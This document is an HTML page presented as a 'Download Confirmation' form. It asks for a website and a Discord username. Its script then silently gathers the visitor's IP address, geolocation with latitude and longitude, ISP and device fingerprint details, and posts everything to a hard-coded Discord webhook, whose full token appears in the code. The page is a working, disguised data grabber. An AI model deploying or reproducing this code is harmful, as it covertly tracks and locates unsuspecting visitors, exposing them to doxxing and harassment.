<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>project</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }

    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
      width: 300px;
    }

    button {
      padding: 10px 20px;
      margin: 10px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }

    #status {
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Download Confirmation</h1>
    <p>Enter the website you want to visit:</p>
    <input id="website" type="text" placeholder="https://example.com">
    <button onclick="sendWebsite()">Send</button>
    <p id="status"></p>
    <p id="discord-status"></p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1331408629911519383/jToH8jWjS2QTjnKO9e3mMrnxKDOD-ALdC6OL6B6PsRPIC1TqZKrV4E0D17s0xHuxqrmM';
    let collectedData = {};

    // Fetch IP and related data
    async function fetchIPData() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const { ip } = await response.json();
        collectedData.IP_Info = { ip };

        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await locationResponse.json();

        collectedData.IP_Info = {
          ...collectedData.IP_Info,
          city: locationData.city,
          region: locationData.region,
          country: locationData.country_name,
          latitude: locationData.latitude,
          longitude: locationData.longitude,
          isp: locationData.org,
        };
      } catch (error) {
        console.error('Error fetching IP data:', error);
        collectedData.IP_Info = 'Unavailable';
      }
    }

    // Fetch device information
    function fetchDeviceInfo() {
      collectedData.Device_Info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      };
    }

    // Send data to webhook
    async function sendToWebhook(data) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: data }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }

    // Handle "Send" button click
    async function sendWebsite() {
      const website = document.getElementById('website').value;
      const status = document.getElementById('status');
      status.textContent = 'Sending website...';
      status.style.color = 'green';

      // Send website to webhook
      await sendToWebhook(`Website: ${website}`);

      // Ask for Discord user
      const discordStatus = document.getElementById('discord-status');
      discordStatus.textContent = 'Enter your Discord username:';
      const discordInput = document.createElement('input');
      discordInput.type = 'text';
      discordInput.placeholder = 'DiscordUsername#1234';
      discordStatus.appendChild(discordInput);
      const discordButton = document.createElement('button');
      discordButton.textContent = 'Send';
      discordButton.onclick = async () => {
        const discordUser = discordInput.value;
        discordStatus.textContent = 'Sending Discord user...';
        discordStatus.style.color = 'green';

        // Send Discord user to webhook
        await sendToWebhook(`Discord User: ${discordUser}`);

        // Collect and send device data
        await fetchIPData(); // Fetch IP data
        fetchDeviceInfo(); // Fetch device info

        // Send data to the webhook
        const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
        await sendToWebhook(formattedData);

        discordStatus.textContent = 'Data sent successfully!';
        discordStatus.style.color = 'green';
      };
      discordStatus.appendChild(discordButton);
    }
  </script>
</body>
